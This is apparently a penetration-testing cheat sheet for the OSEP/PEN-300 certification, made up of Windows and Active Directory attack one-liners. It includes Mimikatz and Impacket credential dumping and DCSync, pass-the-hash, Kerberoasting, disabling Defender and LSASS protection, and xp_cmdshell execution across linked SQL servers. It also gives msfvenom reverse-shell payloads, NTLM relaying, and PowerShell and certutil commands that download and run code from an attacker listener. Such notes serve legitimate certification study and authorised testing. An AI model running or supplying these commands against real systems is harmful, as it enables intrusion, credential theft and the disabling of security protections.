# OSEP
% attacksuite, osep, pen-300
#plateform/windows #target/local #cat/OSEP

# Compile
## Compile csharp exe x64 (Mono)
```
mcs -platform:x64 <source.cs>
```

## Compile csharp dll x64 (Mono)
```
mcs -platform:x64 -target:library <source.cs>
```

## Compile csharp exe x86 (Mono)
```
mcs <source.cs>
```

## Compile csharp dll x86 (Mono)
```
mcs -target:library <source.cs>
```

## Compile csharp dll x64 (Windows)
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library <source.cs>
```

## Compile csharp exe x64 (Windows)
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe <source.cs>
```

## Compile csharp dll x86 (Windows)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library <source.cs>
```

## Compile csharp exe x86 (Windows)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe <source.cs>
```

## add user
```
net user /add <username> <password>
```

## add user to RDP
```
net localgroup "Remote Desktop Users" <username> /add
```

## add user to local administrator
```
net localgroup administrators <username> /add
```

## add user to domain group
```
NET LOCALGROUP "<group_name>" <username> /ADD /DOMAIN
```

## add usdf - Modify service binary path
```
sc config <Service_Name> binpath= "net user rilak 'P@ssw0rd' /add"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
```

# Rubeus
## Rubeus monitor (user or computer)
```
Invoke-Rubeus monitor /interval:5 /nowrap /filteruser:<username>
```

## Rubeus pass the ticket
```
Invoke-Rubeus ptt /ticket:<base64_ticket>
```

## Rubeus show tickets (TGT)
```
Invoke-Rubeus triage
```

## Rubeus dump ticket
```
Invoke-Rubeus dump /nowrap
```

## Rubeus Create a process with other user
```
Invoke-Rubeus asktgt /user:<username> /rc4:<nthash> /createnetonly:powershell.exe /show
```

## Rubeus asreproast PreauthNotRequired user
```
Invoke-Rubeus asreproast /format:hashcat /outfile:hashes.asreproast /user:<username
```

# Mimikatz
## Mimikatz.exe DCSync krbtgt
```
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt" "exit"
```

## Mimikatz.exe Monitor Logon
```
mimikatz.exe "privilege::debug" "misc::memssp" "exit"
```

## Mimikatz.exe Dump mscash - Cached Domain Credentials(DCC2)
```
mimikatz.exe "lsadump::cache" "exit"
```

## Mimikatz.ps1 DCSync krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt"'
```

## Mimikatz.ps1 DCSync all
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /all /csv"'
```

## Mimikatz.ps1 RDP pth
```
Invoke-Mimikatz -Command "sekurlsa::pth /user:<username> /domain:<domain> /ntlm<nthash> /run:'mstsc.exe /restrictedadmin'"
```

## Mimikatz.ps1 Dump SAM and Lsass
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "lsadump::sam" "exit"'
```

## Mimikatz.ps1 Dump passwords of scheduled tasks
```
Invoke-Mimikatz -Command '"vault::cred /patch"'
```

## Mimikatz.ps1 Dump remote machine
```
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

## Mimikatz pth
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nthash> /run:powershell.exe"'
```

## Disable PPL (Lsass Protection) sc.exe - 1
```
cmd /c "sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand"
```

## Disable PPL (Lsass Protection) sc.exe - 2
```
cmd /c "sc start mimidrv"
```

## Disable PPL (Lsass Protection) - 3
```
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
```

# Impacket
## Recon Find Delegation
```
impacket-findDelegation -target-domain <domain> -dc-ip <dc_ip> <domain>/'<username>':'<password>'
```


## secretsdump.py SAM and Lsass
```
impacket-secretsdump <domain>/'<username>':'<passowrd>'@<ip>
```

## Recon Get SPN
```
impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/'<username>':'<password>'
```

## secretsdump.py DCSync using ticket
```
impacket-secretsdump <dc_ip> -k -no-pass -just-dc
```

## secretsdump.py DCSync using hash
```
impacket-secretsdump -just-dc -hashes <hashes> <domain>/'<username>'@<dc_ip>
```

## secretsdump.py DCSync using password
```
impacket-secretsdump -just-dc <hashes> <domain>/'<username>':'<password>'@<dc_ip>
```

## secretsdump.py Dump mscash - Cached Domain Credentials
```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

## ticketConverter.py Convert kribi to ccache
```
impacket-ticketConverter <kribi> <ccache>.ccache && export KRB5CCNAME=/tmp/<ccache>.ccache
```

## lookupsid.py lookupsid Get DomainSID
```
impacket-lookupsid -domain-sids <domain>/'<username>':'<password>'@<dc_host> 0
```

## psexec.py psexec using password
```
impacket-psexec <domain>/'<username>':'<password>'@<hostname>
```

## psexec.py psexec using hash
```
impacket-psexec -hashes :<nthash> <domain>/'<username>'@<hostname>
```

## winexec.py using password
```
impacket-wmiexec <domain>/'<username>':'<password>'@<hostname>
```

## winexec.py using hash
```
impacket-wmiexec -hashes :6fe92d4fd19b4dd83f5f1be72079d7ef <domain>/'<username>'@<hostname>
```

## impacket Rpcdump check printer service
```
impacket-rpcdump <domain>/'<user>':'<password>'@<dc-ip> | grep MS-RPRN
```

## impacket smbserver
```
impacket-smbserver share . -smb2support
```

## impacket reg query example
```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' 
```

## impacket reg add example (Allow rdp connection without password)
```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```

##  impacket reg del example
```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'
```

## impacket add a computer
```
addcomputer.py -computer-name '<computername>$' -computer-pass '<computer_password>' -dc-host <dc_ip> '<domain>/<username>:>user_password'
```

## impacket add rbcd from X (new_computer) to constrained (target_computer)
```
rbcd.py -delegate-from '<new_computer>$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action 'write' -hashes ':<new_computer_owner_nthash' <domain>/'<target_computer>$'
```

## impacket Sliver Ticket for DC
```
getST.py -self -impersonate "Administrator" -altservice "cifs/<dc_hostname>" -k -no-pass -dc-ip <dc_ip> <domain>/'<dc_hostname>$'

export KRB5CCNAME=<ticket_from_output>.ccache
```



# PowerView
https://powersploit.readthedocs.io/en/stable/Recon/README/

## Recon Get Groups
```
Get-DomainGroup -domain <domain> | select samaccountname
```

## Recon Get GroupMembers
```
Get-DomainGroupMember -domain <domain> -Identity <identity> | select MemberName
```

## Recon Find groups's ACEs on current user
```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Find user's ACEs on current user
```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Find computer's ACEs on current user
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Enum GenericWrite permissions on computer objects
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | select Identity, AceType, ObjectDN
```

## Recon Find Unconstrained Delegation Computers
```
Get-DomainComputer -Unconstrained | select useraccountcontrol, name
```

## Recon Find Constrained Delegation Users
```
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-List
```

## Recon Find Constrained Delegation Computers
```
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-List
```

## Recon Get DomainSID
```
Get-DomainSid -Domain <domain>
```

## Recon Get GPOs
```
Get-NetGPO | select displayname, gpcfilesyspath
```

## Recon Get SPN
```
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

## Recon Find Preauth user
```
Get-NetUser -PreauthNotRequired
```

## Post-Recon Enum Domain Trust
```
Get-DomainTrust -Domain <domain>
```

## Post-Recon Enum Domain Trust Map
```
Get-DomainTrustMapping
```

## PowerView Add user to domain group
```
Add-DomainGroupMember -Identity '<groupname>' -Members '<username>'
```

## PowerView Set SPN
```
Set-DomainObject -Credential $creds -Identity <account> -Set @{serviceprincipalname="fake/NOTHING"}
```

## Lateral Movement  Find-LocalAdminAccess
```
Find-LocalAdminAccess -Verbose
```

##  Lateral Movement - UserHunter
```
Invoke-UserHunter -CheckAccess
```

## ACEs ForceChangePassword (PowerView)
```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Verbose
```

## ACEs ForceChangePassword (On Windows)
```
net user <username> P@ssw0rd /domain
```

## ACEs ForceChangePassword (On Kali, with password)
https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
```
net rpc password <TargetUser> -U <domain>/<ControlledUser>%<Password> -S <DC>
```

## ACEs ForceChangePassword (On Kali, with hash)
```
pth-net rpc password <TargetUser> -U <domain>/<ControlledUser>%ffffffffffffffffffffffffffffffff:<nthash> -S <DC>
```

### ACEs add Rights
```
Add-DomainObjectAcl -TargetIdentity <GroupName> -PrincipalIdentity <Account> -Rights All
```

# Windows

## Find DC IP
```
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain> <DNS>
```

## Windows Download file
```
certutil.exe -urlcache -f http://<listen_ip>:<listen_port>/<filename> <filename>
```

## Windows Download file (PowerShell)
```
iwr "http://<listen_ip>:<listen_port>/<filename>" -OutFile "<filename>"
```

## Enum SPN
```
setspn.exe -Q */*
```

## Chisel reverse (on server)
```
sudo ./chisel server -p <listen_port> --reverse --socks5
```

## Chisel reverse (on client)
```
.\chisel.exe client <listen_ip>:<listen_port> R:socks
```

## Windows psexec.exe
```
psexec.exe -u <domain>\<username> -p <password> \\<hostname> cmd.exe
```

## Clean Defender rules
```
"c:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Disable Defender realtime monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Disable Defender IOAV Protection
```
Set-MpPreference -DisableIOAVProtection $true
```

## Windows Disable RDP restricted admin
https://www.rebeladmin.com/2016/02/restricted-admin-mode-for-remote-desktop-connections/
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

## Check permission
```
icacls <path>
```

## Check spoolss service
```
dir \\<hostanme>\pipe\spoolss
```

## PsExec.exe
```
\PsExec32.exe -accepteula -s \\<hostname> cmd
```

## Check files permission script
```
for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 
```

## Reboot 
```
shutdown /r /t 0 /f
```

##  Check PPL (value 1 is protection enabled)
```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

## RunAs
```
runas /netonly /user:<domain>\<user> "powershell.exe -exec bypass"
```

## finsdstr in  SYSVOL files
```
findstr /s /i cpassword \\<domain>\sysvol\<domain>\policies\*.xml
```


## Hostname to IP (powershell)
```
[System.Net.Dns]::GetHostByAddress("<ip_address>").Hostname
```

## Hostnames to IP (powershell)
```
1..254 | ForEach-Object { Try { Write-Host -NoNewline ([System.Net.Dns]::GetHostByAddress("<class_C>.$_").Hostname);echo "  $_;" } Catch { } }
```

## Hostname to IP (ping)
```
Ping -a <ip_address>
```

## Add user to RDP Group
```
NET LOCALGROUP "Remote Desktop Users" <domain>\<username> /ADD
```

## IIS List sites
```
appcmd.exe list site
```

## IIS List Virtual Directory
```
appcmd.exe list vdir
```

## Check Proxy (ProxyEnable, ProxyServer)
Ch3
```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v proxy*
```

# PowerUpSQL
https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

## PowerUpSQL SQLServerLinkCrawl
```
Get-SQLServerLinkCrawl -Instance <sqlserver> | format-table
```

## PowerUpSQL Check current user
```
Get-SQLQuery -Instance <sqlserver> -Query "SELECT SYSTEM_USER;"
```

## PowerUpSQL Check is sysadmin
```
Get-SQLQuery -Instance <sqlserver> -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
```

## PowerUpSQL Enable xp_cmdshell
```
Get-SQLQuery -Instance <sqlserver> -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

## PowerUpSQL Execute xp_cmdshell
```
Invoke-SQLOSCmd -Verbose -Instance <sqlserver> -Command "<cmd>"
```


## PowerUpSQL Escalate to sysadmin
```
Invoke-SQLEscalatePriv -Verbose -Instance <sqlserver>
```

## findstr
```
findstr /s /i <keyword> *.*
```

## findstr db password in web.config
```
findstr /s /i ConnectionString <PATH>*.config && echo finish
```

## Powershell Load DLL
```
Add-Type -LiteralPath <filename.dll>
```

# MSSQL

## Find lined servers
```
EXEC sp_linkedservers;
```

## xp_dirtree
https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet
```
exec xp_dirtree '\\<listen_ip>\file'
```

## Check link server AT other server
```
EXEC ('sp_linkedservers') AT [<link_sqlserver>]
```

## Check sysadmin on link server
```
select mylogin from openquery("<link_sqlserver>", 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as mylogin');
```

## Enable xp_cmdshell on link server
```
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<link_sqlserver>]
```

## Exec xp_cmdshell on link server
```
EXEC ('EXEC xp_cmdshell ''<cmd>'' ') AT [<link_sqlserver>]
```

## Enable xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## Exec xp_cmdshell
```
EXEC xp_cmdshell '<cmd>'
```

## Check show advanced options
```
sp_configure 'show advanced options'
```

## Check xp_cmdshell
```
sp_configure 'xp_cmdshell'
```

## Check sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Current user
```
SELECT SYSTEM_USER;
```

## List password hash on database
```
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## show databases
```
SELECT name, database_id, create_date FROM sys.databases;
```

## show tables (master)
```
SELECT name FROM master..sysobjects WHERE xtype = 'U';
```

## show tables (INFORMATION_SCHEMA.TABLES)
```
SELECT * FROM INFORMATION_SCHEMA.TABLES
```

## show tables
```
SELECT name FROM <database>..sysobjects WHERE xtype = 'U';
```

## Login as user (e.g. sa)
```
EXECUTE AS LOGIN = '<username>';
```

## Execute as user
```
use msdb; EXECUTE AS USER = 'dbo';
```

## enum_logins
https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16&tabs=sql
```
select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
from  master.sys.server_principals r 
left join master.sys.syslogins sl on sl.sid = r.sid 
where r.type in ('S','E','X','U','G')
```

## enum_impersonate list all login with impersonation permission
Login are created at the SQL Server instance level. SQL Login is for Authentication.
```
SELECT 'LOGIN' as 'execute as','' AS 'database', 
pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
FROM sys.server_permissions pe 
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id 
JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

## enum_impersonate list all users with impersonation permission
User is created at SQL Server database level. SQL Server User is for Authorization.
```
use <db>;
SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
FROM sys.database_permissions pe 
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id 
JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

## enum_links
```
EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin
```


# xfreerdp
## xfreerdp pth
```
xfreerdp /u:<username> /d:<domain> /pth:<nthash> /v:<ip>
```

## PowerShell PSSession
```
Enter-PSSession -Computername <hostname>
```

## RPCOut (ErrorMsg: is not configured for RPC)
```
EXEC sp_serveroption '<ServerName>', 'rpc out', 'true';
```

# Hashcat
## Hashcat SPN (`$krb5tgs$23$*user$realm$test/spn*$633...`)
```
hashcat -m 13100 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

## Hashcat Cracking mscash (e.g. $DCC2$10240#spot#3407..)
```
hashcat -m2100 '<mscash>' /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

## Hashcat NetNTLMv2 (e.g. SMB Auth)
```
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt --force
```

## Hashcat Cracking AS-REP (ASREPRoast, PreauthNotRequired)
```
hashcat -m 18200 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

## Hashcat MSSQL (2012, 2014) 0x02....
```
hashcat -m 1731 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

# PowerShell
## Recon LanguageMode
```
$ExecutionContext.SessionState.LanguageMode
```

## Recon username
```
$env:username
```

## Recon Portscan
```
Test-NetConnection -ComputerName <ip> -Port <port>
```

## Recon Check 32 bit or 64 bit
```
powershell -c "[Environment]::Is64BitProcess"
```

## Recon Get PowerShell history
```
(Get-PSReadlineOption).HistorySavePath
```

## Powershell history defualt location
```
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Recon Check command
```
Get-Command
```

## Recon Check PPL (Lsass Protection)
```
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Recon Check Applocker rules
```
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## Recon PortScan (Slow)
```
$target = '<IP>';$scanPorts = @('25', '80', '88', '110', '135', '139', '389', '443', '445', '1433', '3128', '8080', '8081', '5985', '5986'); foreach($port in $scanPorts){Write-Host $port; Test-NetConnection -ComputerName $target -InformationLevel "Quiet" -Port $port}
```

## Recon PortScan (Invoke-Portscan.ps1)
```
Invoke-Portscan -Hosts "<IP>" -TopPorts 400 | Select-Object -ExpandProperty openPorts
```

## PowerShell Call 64 bit - 1
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## PowerShell Call 64 bit - 2
```
Environ("COMSPEC") & " /k c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
```

## PowerShell Call 64 bit - 3
```
&"$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
```

## Break out JEA
https://infra.newerasec.com/infrastructure-testing/breakout/just-enough-administration-jea
```
&{ <cmd> }
```

## Exec remote ps1 (PowerShell)
```
powershell i`e`x(iWr -UsEbaSIcparSING http://<listen_ip>:<listen_port>/<filename>);
```

# BloodHound

## SharpHound PowerShell
```
Invoke-BloodHound -collectionmethod all -domain <domain> -OutputDirectory (Get-Location) -SearchForest
```

##  bloodhound-python
```
bloodhound-python -u <username> -p '<password>' -ns <NS_IP> -d <domain> -c all
```

## bloodhound-python with proxychains
```
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns <DNS_IP> --dns-tcp --dns-timeout 20
```

## bloodhound-python with proxychains & dnschief
```
python3 dnschef.py --fakeip <DC_IP> --fakedomains <domain>
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns 127.0.0.1
```

# Python tools
## printerbug
https://github.com/dirkjanm/krbrelayx
```
python3 printerbug.py <domain>/'<username>':'<password>'@<dc-host> <unconstrained-host>   
```

# Tools
## SpoolSample.exe
```
Invoke-SpoolSample <from-host> <to-host>
```

## evil-winrm
https://github.com/Hackplayers/evil-winrm
```
evil-winrm  -i <ip> -u <username> -p '<password' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

## rustscan
```
rustscan -a <ip> --ulimit 500 -- -sV
```

## PySQLTools using NTLM
```
python3 PySQLTools.py <domain>/'<username>'@<ip> -hashes :<nthash> -windows-auth
```

## PySQLTools using Password
```
python3 PySQLTools.py <domain>/'<username>':'<password>'@<ip> -windows-auth
```

# PowerUp
## Recon AllChecks
```
Invoke-AllChecks
```

## Recon Get UnquotedService
```
Get-UnquotedService
```

## Recon Get ModifiableServiceFile
```
Get-ModifiableServiceFile
```

## PrivEsc Add user to local administrators group
```
Invoke-ServiceAbuse -Name '<VulnerableSvc>' -UserName '<doamin>\<username>'
```

## PrivEsc Exploit vulnerable service permissions
```
Invoke-ServiceAbuse -Name "<VulnerableSvc>" -Command "net localgroup Administrators <domain>\<username> /add"
```

## PrivEsc Exploit an unquoted service path
```
Write-ServiceBinary -Name '<VulnerableSvc>' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\<VulnerableSvc>'
```

# Meterpreter 
## load incognito
```
load incognito
```

## incognito
```
list_tokens -u
```

## migrate
```
run post/windows/manage/priv_migrate NAME=notepad.exe ANAME=svchost.exe
```

##  Check PPL
```
reg queryval -k "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -v RunAsPPL
```

## Windows 64bit shell reverse tcp
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Linux 64bit shell reverse tcp
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## ASP reverse_tcp
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

# PowerUp.ps1
## DLL Hijacking
```
Write-HijackDll -DllPath 'C:\Users\ted\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -UserName '<domain>\username'
```

## ServiceAbuse
```
Invoke-ServiceAbuse -Name 'vds' -UserName '<domain>\username'
```

# Linux
## Spawn TTY
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## JFrog
```
/opt/jfrog/artifactory/var/backup/access
```

## Insert SSH key
```
echo '<id_rsa.pub> >>' authorized_keys
```

## Exec ansible
```
ansible-playbook <yml>
```

## Ansible vault decrypt
```
cat <file.yml> | ansible-vault decrypt
```

## Ansible vault decrypt
```
ansible-vault decrypt <file.yml> --output decrypted.txt
```

## PortScan (NC)
```
for i in $(echo "<IP>"|tr "," "\n"); do echo -e "21\n22\n80\n135\n443\n445\n88\n389\n1433\n3306\n3389\n5985\n5986\n8001\n8002\n8080\n8081\n8443" | xargs -i nc -w 1 -zvn $i {}; done
```

# GodPotato
```
GodPotato-NET4.exe -cmd "net user rilak 1qaz@WSX /add"
GodPotato-NET4.exe -cmd "net localgroup Administrators rilak /add"
```

# Kiwi

## Load kiwi
```
load kiwi
```

## Lsass
```
kiwi_cmd "sekurlsa::logonPasswords"
```

## SAM
```
lsa_dump_sam
```

## Lsass
```
lsa_dump_secrets
```

# Other

## Proof.txt Linux 1
```
whoami && hostname && ip a && cat proof.txt
```

## Proof.txt Linux 2
```
whoami && hostname && ifconfig && cat proof.txt
```

## Proof.txt Windows
```
whoami && hostname && ipconfig && type proof.txt
```

## lsassy
```
lsassy -d <domain> -u username -p <password <IP> -m dumpertdll -O dumpertdll_path=/home/kali/tools/Outflank-Dumpert-DLL.dll
```

# Disable Protection
## Windows disable LocalAccountTokenFilterPolicy (Allow to access C$ remotely)
```
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

## sendemail
```
sendemail -f <from_email> -t <to_email> -s <SMTP_IP> -u <SUBJECT> -m <content> -a <attachements> -v
```


# ntlmrelayx

## ntlmrelayx Ldap
```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://<target> -l /save/loot
```

## ntlmrelayx MSSQL
```
impacket-ntlmrelayx --no-http-server -smb2support -t mssql://<target> -q "SELECT SYSTEM_USER"
```

## ntlmrelayx MSSQL
```
impacket-ntlmrelayx --no-http-server -smb2support -t mssql://<target> -q "SELECT SYSTEM_USER"
```

## ntlmrelayx SMB Command
```
impacket-ntlmrelayx --no-http-server -smb2support -t smb://<target> -c "powershell.exe iex(iWr -UsEbaSIcparSING http://IP/a.ps1);"
```


# Crackmapexec

## check smb not signed
```
cme smb <IP> --gen-relay-list <output_file>
```

## check machine account quota
```
cme ldap <target> -u <username> -p <password> -d <domain> -M MAQ
```

## read LAPS
```
cme ldap <dc_ip> -d <domain> -u <username> -p '<password>' --module laps
```

# LAPSToolkit

## LAPSToolkit command
```
Get-LAPSComputers
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
